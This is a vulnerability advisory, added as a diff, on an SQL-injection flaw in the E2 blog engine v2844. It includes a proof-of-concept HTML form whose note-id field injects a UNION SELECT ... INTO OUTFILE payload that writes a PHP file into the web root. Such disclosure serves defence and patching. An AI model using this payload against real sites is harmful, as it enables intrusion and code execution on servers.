@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/68843/info
+
+Ilya Birman E2 is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+An attacker can exploit this issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+E2 v2844 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/@actions/comment-process" method="post" name="main">
+<input type="hidden" name="already-subscribed" value="">
+<input type="hidden" name="comment-id" value="new">
+<input type="hidden" name="elton-john" value="1">
+<input type="hidden" name="email" value="mail@mail.com">
+<input type="hidden" name="from" value="">
+<input type="hidden" name="name" value="name">
+<input type="hidden" name="subscribe" value="on">
+<input type="hidden" name="text" value="1">
+<input type="hidden" name="note-id" value="' UNION SELECT '<? phpinfo(); ?>',2,3,4,5,1,7,8,9,10,11,12,13,14,15 INTO OUTFILE '/var/www/file.php' -- 2">
+<input type="submit" id="btn">
+</form>
